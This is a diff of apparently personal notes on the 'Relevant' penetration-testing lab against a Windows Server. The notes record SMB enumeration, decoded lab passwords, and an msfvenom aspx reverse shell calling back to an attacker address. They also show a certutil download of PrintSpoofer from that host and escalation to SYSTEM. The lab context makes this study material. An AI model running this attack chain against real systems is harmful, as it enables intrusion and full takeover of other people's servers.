@@ -1,5 +1,7 @@
 Relevant Penetration Testing Challenge:
 
+SMB + Windows Server
+
 ######################################################################################
 
 Scope of Work
@@ -28,7 +30,7 @@ Machine may take up to 5 minutes for all services to start.
 
 ######################################################################################
 
-1-Enumerate:
+1-Enumerate 1st Attempt:
    nmap -T5 -Pn -sC -sV <IP> -oN enum/scan.log:
 
     PORT     STATE SERVICE       VERSION
@@ -78,7 +80,6 @@ Machine may take up to 5 minutes for all services to start.
 
 
     -SMB ENUM NMAP:
-
         sudo nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 <IP>
             
             PORT    STATE         SERVICE
@@ -98,9 +99,10 @@ Machine may take up to 5 minutes for all services to start.
             do_connect: Connection to <IP> failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
             Unable to connect with SMB1 -- no workgroup available
 
-         crackmapexec smb 10.10.25.251           
-                    SMB  10.10.25.251  445  RELEVANT [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
-       
+
+        crackmapexec smb 10.10.25.251           
+                SMB  10.10.25.251  445  RELEVANT [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
+    
 
         ──(kali㉿kali)-[~/Desktop/Relevant_Penetration_Testing_Challenge]
             └─$ smbclient //<IP>/nt4wrksv -Uguest
@@ -113,7 +115,103 @@ Machine may take up to 5 minutes for all services to start.
                 Qm9iIC0gIVBAJCRXMHJEITEyMw==QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
                 /tmp/smbmore.17UHPt (END)
 
-                Base64: Bob - !P@$$W0rD!123&WsFFC#cccBB ?????
-                        Bob - !P@$$W0rD!123
+                Base64: Bob - !P@$$W0rD!123
+                        Bill - Juw4nnaM4n420696969!$$$
+
+
+            Bob:
+            root@ip-10-10-219-126:~# enum4linux -a -u'Bob' -p'!P@$$W0rD!123' 10.10.61.216
+
+            WARNING: The "syslog" option is deprecated    
+
+                Sharename       Type      Comment
+                ---------       ----      -------
+                ADMIN$          Disk      Remote Admin
+                C$              Disk      Default share
+                IPC$            IPC       Remote IPC
+                nt4wrksv        Disk     
+
+
+        SMB Try to Exploit:
+
+            evil-winrm -i <IP> -u '' -p ''  <---Don't work
+
+----------------------------------------------------------------------------------------------------------------------
+
+Enumerate 2cnd Attempt ALL PORTS:
+    nmap -T5 -Pn -sC -sV -p- IP -vv:
+
+    49663/tcp open  http   syn-ack Microsoft IIS httpd 10.0
+    | http-methods: 
+    |   Supported Methods: OPTIONS TRACE GET HEAD POST
+    |_  Potentially risky methods: TRACE
+    |_http-server-header: Microsoft-IIS/10.0
+    |_http-title: IIS Windows Server
+    49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
+    Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+    49667/tcp open  msrpc   syn-ack Microsoft Windows RPC
+
+    http://<IP>:49663/nt4wrksv/passwords.txt:
+        -Give us the same result as the SMB Share Folder found before
+
+    In the smb we will try to create text.txt file just to test if we have the "Write and UPLOAD" rigths if so we will inject a remote shell:
+
+        (kali㉿kali)-[~/Desktop/Relevant_Penetration_Testing_Challenge]
+        └─$ echo test if smb write run > text.txt   
+
+        smbclient //<IP>/nt4wrksv -Uguest:
+        smb: \> put text.txt
+
+        It Works !
+
+
+Exploit:
+    We create an msfvenom reverse shell in aspx format:
+        msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.1.162 LPORT=443 -f aspx -o rev.aspx
+        +
+        nc -lvnp 443
+
+
+    We put in the SMB:
+        smb: \> put rev.aspx
+        putting file rev.aspx as \rev.aspx (9.0 kb/s) (average 4.5 kb/s)
+
+    We execute the shell:
+        http://<IP>:49663/nt4wrksv/rev.aspx
+
+
+
+Windows Privilege Escalation:
+    whoami
+
+    whoami /priv:
+        SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+
+        Potatoe Attack - But don't work in this case 
+
+    PrintSpoofer.exe Attack
+    cd c:\inetpub\wwwroot>
+        c:\inetpub\wwwroot>certutil.exe -urlcache -f http://10.6.1.162/PrintSpoofer.exe printspoofer.exe
+    If it NOT WORKING we will use SMB client
+
+        smbclient //<IP>/nt4wrksv -Uguest:
+            smb: \> put PrintSpoofer.exe
+
+    c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c cmd
+        PrintSpoofer.exe -i -c cmd
+        [+] Found privilege: SeImpersonatePrivilege
+        [+] Named pipe listening...
+        [+] CreateProcessAsUser() OK
+        Microsoft Windows [Version 10.0.14393]
+        (c) 2016 Microsoft Corporation. All rights reserved.
+
+    C:\Windows\system32>whoami
+    whoami
+    nt authority\system
+
+    WE ARE ROOT
+
+
+
 
 
